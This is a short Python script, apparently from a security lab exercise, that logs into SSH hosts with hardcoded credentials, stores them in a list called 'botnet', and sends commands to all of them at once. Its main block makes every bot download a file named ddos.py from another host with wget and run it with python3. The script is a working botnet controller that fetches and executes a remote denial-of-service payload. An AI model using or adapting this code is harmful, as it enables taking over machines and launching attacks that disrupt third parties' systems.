from pexpect import pxssh

botnet = []


class SSHClient:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnet_command(command):
    for client in botnet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' + output.decode())


def add_client(host, user, password):
    client = SSHClient(host, user, password)
    botnet.append(client)


if __name__ == '__main__':
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')
    add_client('172.16.12.137', 'xuyiqing', 'xuyiqing')

    botnet_command('wget http://172.16.12.134/ddos.py -O ddos.py')
    botnet_command('python3 ddos.py')
